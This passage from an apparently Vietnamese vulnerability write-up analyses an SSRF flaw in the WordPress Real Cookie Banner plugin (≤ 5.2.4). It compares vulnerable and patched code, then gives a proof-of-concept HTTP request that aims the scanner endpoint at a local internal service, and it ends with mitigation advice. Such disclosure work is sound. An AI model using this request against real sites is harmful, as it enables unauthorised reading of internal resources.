&amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, hàm &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; nhận tham số &lt;code&gt;url&lt;/code&gt; trực tiếp từ &lt;code&gt;$request-&amp;gt;get_param(&#39;url&#39;)&lt;/code&gt; và sử dụng nó ngay trong lệnh &lt;code&gt;wp_remote_get()&lt;/code&gt; mà không có bất kỳ cơ chế kiểm tra hoặc lọc nào =&amp;gt; Điều này dẫn đến lỗ hổng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Phần trả về đóng gói toàn bộ kết quả từ &lt;code&gt;wp_remote_get($url)&lt;/code&gt; thành JSON:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;status&lt;/code&gt;, &lt;code&gt;statusText&lt;/code&gt;: mã và thông điệp HTTP.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ok&lt;/code&gt;: true nếu mã 2xx.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;headers&lt;/code&gt;: toàn bộ header của response.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;redirected&lt;/code&gt;, &lt;code&gt;responseUrl&lt;/code&gt;: thông tin redirect nếu có.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;body&lt;/code&gt;: nội dung trả về từ URL.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; Server thực chất chuyển tiếp toàn bộ phản hồi từ URL nội bộ ra ngoài, gây rò rỉ dữ liệu khi bị SSRF.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function routeScanWithoutLogin($request)&#xA;{&#xA;    $url = $request-&amp;gt;get_param(&amp;#39;url&amp;#39;);&#xA;    $jobId = $request-&amp;gt;get_param(&amp;#39;jobId&amp;#39;);&#xA;    // Validate that the URL belongs to the jobs&amp;#39; domain to prevent SSRF attacks&#xA;    $jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&#xA;    $parsed_url = \wp_parse_url($url);&#xA;    if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;    }&#xA;    $current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;    if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;        return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;    }&#xA;    if ($checker-&amp;gt;start($url, \false)) {&#xA;        $requestArguments = $checker-&amp;gt;getRequestArguments();&#xA;        $result = \wp_remote_get($url, [&amp;#39;redirection&amp;#39; =&amp;gt; 0, &amp;#39;cookies&amp;#39; =&amp;gt; $requestArguments[&amp;#39;cookies&amp;#39;], &amp;#39;headers&amp;#39; =&amp;gt; $requestArguments[&amp;#39;headers&amp;#39;], &amp;#39;timeout&amp;#39; =&amp;gt; $requestArguments[&amp;#39;timeout&amp;#39;], &amp;#39;sslverify&amp;#39; =&amp;gt; $requestArguments[&amp;#39;sslverify&amp;#39;]]);&#xA;        $status = \wp_remote_retrieve_response_code($result);&#xA;    &#xA;        $ok = $status &amp;gt;= 200 &amp;amp;&amp;amp; $status &amp;lt; 300;&#xA;        $location = \wp_remote_retrieve_header($result, &amp;#39;Location&amp;#39;);&#xA;        return new WP_REST_Response([&amp;#39;status&amp;#39; =&amp;gt; $status, &amp;#39;statusText&amp;#39; =&amp;gt; \wp_remote_retrieve_response_message($result), &amp;#39;ok&amp;#39; =&amp;gt; $ok, &amp;#39;headers&amp;#39; =&amp;gt; (object) \wp_remote_retrieve_headers($result), &amp;#39;redirected&amp;#39; =&amp;gt; !empty($location), &amp;#39;responseUrl&amp;#39; =&amp;gt; $location, &amp;#39;body&amp;#39; =&amp;gt; \wp_remote_retrieve_body($result)]);&#xA;    } else {&#xA;        return new WP_Error(&amp;#39;rest_scan_without_login_error&amp;#39;, &amp;#39;Loopback request could not be started.&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đa thêm các biện pháp xác thực đầu vào để ngăn chặn việc sử dụng URL tùy ý:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Trích xuất URL hợp lệ của job hiện tại&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$jobDataUrl = $job-&amp;gt;data-&amp;gt;url;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Lấy domain hợp lệ mà job được phép xử lý.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Phân tích và xác thực cấu trúc URL do người dùng gửi lên&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$parsed_url = \wp_parse_url($url);&#xA;if (!$parsed_url || !isset($parsed_url[&amp;#39;host&amp;#39;])) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_url&amp;#39;, &amp;#39;Invalid URL provided&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Đảm bảo URL hợp lệ, có phần &lt;code&gt;host&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;So sánh domain hợp lệ với domain của job&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$current_domain = \wp_parse_url($jobDataUrl, \PHP_URL_HOST);&#xA;if ($parsed_url[&amp;#39;host&amp;#39;] !== $current_domain) {&#xA;    return new WP_Error(&amp;#39;rest_invalid_domain&amp;#39;, &amp;#39;URL must belong to the jobs\&amp;#39; domain&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Nếu domain khác, trả về lỗi thay vì tiếp tục thực hiện request. Giới hạn request chỉ trong cùng domain hợp lệ, loại bỏ khả năng SSRF đến hệ thống khác.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; được đăng ký làm callback cho REST API tại đường dẫn &lt;code&gt;/wp-json/&amp;lt;namespace&amp;gt;/scanner/scan-without-login&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;register_rest_route(&#xA;    $namespace,&#xA;    &amp;#39;/scanner/scan-without-login&amp;#39;,&#xA;    [&#xA;        &amp;#39;methods&amp;#39;             =&amp;gt; &amp;#39;GET&amp;#39;,&#xA;        &amp;#39;callback&amp;#39;            =&amp;gt; [$this, &amp;#39;routeScanWithoutLogin&amp;#39;],&#xA;        &amp;#39;permission_callback&amp;#39; =&amp;gt; [$this, &amp;#39;permission_callback&amp;#39;],&#xA;        &amp;#39;args&amp;#39;                =&amp;gt; [&#xA;            &amp;#39;url&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;string&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;            &amp;#39;jobId&amp;#39; =&amp;gt; [&#xA;                &amp;#39;type&amp;#39;     =&amp;gt; &amp;#39;number&amp;#39;,&#xA;                &amp;#39;required&amp;#39; =&amp;gt; true,&#xA;            ],&#xA;        ],&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;API sử dụng &lt;strong&gt;GET&lt;/strong&gt;, yêu cầu hai tham số bắt buộc &lt;code&gt;url&lt;/code&gt; (string) và &lt;code&gt;jobId&lt;/code&gt; (number). Quyền truy cập được kiểm tra qua &lt;code&gt;permission_callback()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const MANAGE_MIN_CAPABILITY = &amp;#39;manage_real_cookie_banner&amp;#39;;&#xA;&#xA;public function permission_callback()&#xA;{&#xA;    return \current_user_can(Core::MANAGE_MIN_CAPABILITY);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&#34;https://docs.devowl.io/real-cookie-banner/php/classes/DevOwl-RealCookieBanner-Core.html#toc-constants&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;manage_real_cookie_banner&lt;/code&gt;&lt;/a&gt; mặc định chỉ dành cho &lt;strong&gt;administrator&lt;/strong&gt;, nên endpoint chỉ có thể gọi được bởi người dùng có quyền này. Đường dẫn đầy đủ của endpoint có thể được xác định bằng cách truy cập &lt;code&gt;/wp-json&lt;/code&gt; và tìm từ khóa &lt;code&gt;scan-without-login&lt;/code&gt; thay vì &lt;code&gt;trace&lt;/code&gt; thêm logic của plugin.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#34; title=&#34;API chứa scan-without-login trong /wp-json&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/api.png&#34; data-sub-html=&#34;&lt;h2&gt;API&lt;/h2&gt;&lt;p&gt;API chứa scan-without-login trong /wp-json&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/api.png&#39; alt=&#34;API&#34; height=&#34;921&#34; width=&#34;1504&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;API chứa scan-without-login trong /wp-json&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Endpoint chính thức của API: &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi chú&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Từ &lt;code&gt;job&lt;/code&gt; trong &lt;code&gt;jobId&lt;/code&gt; tôi liên tưởng đến một công việc đang chạy và được &lt;strong&gt;tracking&lt;/strong&gt; qua &lt;code&gt;jobId&lt;/code&gt;. Tôi đặt điểm debug trong &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; và thử chức năng, cho tất cả request đi qua proxy BurpSuite. &lt;strong&gt;Scanner&lt;/strong&gt; là chức năng gọi API này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#34; title=&#34;Debugger&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/debug.gif&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/debug.gif&#39; alt=&#34;Debug&#34; height=&#34;1200&#34; width=&#34;1920&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Quan sát trong tab HTTP history của BurpSuite thấy request đến API bị bắt và hiển thị trong HTTP History:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#34; title=&#34;Request đến API được bắt trong HTTP History&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/http_history.png&#34; data-sub-html=&#34;&lt;h2&gt;HTTP History&lt;/h2&gt;&lt;p&gt;Request đến API được bắt trong HTTP History&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/http_history.png&#39; alt=&#34;HTTP History&#34; height=&#34;704&#34; width=&#34;1268&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Request đến API được bắt trong HTTP History&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo local service đơn giản bằng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def test():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;metadata&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Sử dụng chức năng scanner và cho request đi qua proxy BurpSuite với người dùng Administrator&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Bắt request đến endpoint &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Chỉnh sửa URL và gửi:&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838&amp;amp;_locale=user&amp;amp;url=http://localhost:8001/metadata&amp;amp;jobId=65 HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: application/json, */*;q=0.1&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component&#xA;X-WP-Nonce: 83df92a708&#xA;Connection: keep-alive&#xA;Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#34; title=&#34;Nội dung đọc được từ local service&#34; data-thumbnail=&#34;/posts/2025-10-29-cve-2025-12136/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Nội dung đọc được từ local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-29-cve-2025-12136/result.png&#39; alt=&#34;Result&#34; height=&#34;536&#34; width=&#34;1821&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nội dung đọc được từ local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 5.2.4&lt;/strong&gt; của &lt;strong&gt;Real Cookie Banner&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;SSRF&lt;/strong&gt; tại endpoint &lt;code&gt;/wp-json/real-cookie-banner/v1/scanner/scan-without-login&lt;/code&gt;. Hàm &lt;code&gt;routeScanWithoutLogin()&lt;/code&gt; nhận &lt;code&gt;url&lt;/code&gt; từ client rồi gọi &lt;code&gt;wp_remote_get()&lt;/code&gt; và trả về nguyên vẹn &lt;code&gt;body&lt;/code&gt;/&lt;code&gt;headers&lt;/code&gt;, cho phép kẻ có quyền Administrator (hoặc session admin bị chiếm) đọc/tra cứu tài nguyên nội bộ. Bản &lt;strong&gt;5.2.5&lt;/strong&gt; đã thêm kiểm tra domain (so sánh host với domain của job) để ngăn URL ngoài phạm vi và giảm nguy cơ; việc chuyển sang &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; và bổ sung kiểm tra bổ trợ là cần thiết để bảo vệ tốt hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Cập nhật plugin lên &lt;strong&gt;5.2.5+&lt;/strong&gt; ngay lập tức.&lt;/li&gt;&#xA;&lt;li&gt;Không tin tưởng URL từ client — validate/normalize và áp allowlist domain trước khi fetch.&lt;/li&gt;&#xA;&lt;li&gt;Chặn request tới IP private/loopback sau khi resolve DNS (127.0.0.0/8, 10/8, 192.168/16, fc00::/7, v.v.).&lt;/li&gt;&#xA;&lt;li&gt;Hạn chế quyền gọi endpoint; không cấp cho tất cả user, tránh &lt;code&gt;__return_true&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Tránh forward credentials/cookies nội bộ; không trả nguyên header/body thô nếu không cần thiết.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;wp_safe_remote_get()&lt;/code&gt; kết hợp kiểm tra redirect, timeout, và SSL; log và giới hạn kích thước body trước khi trả về client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/real-cookie-banner/vulnerability/wordpress-real-cookie-banner-gdpr-eprivacy-cookie-consent-plugin-5-2-4-authenticated-admin-server-side-request-forgery-via-scan-without-login-endpoint-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Real Cookie Banner Plugin &amp;lt;= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) 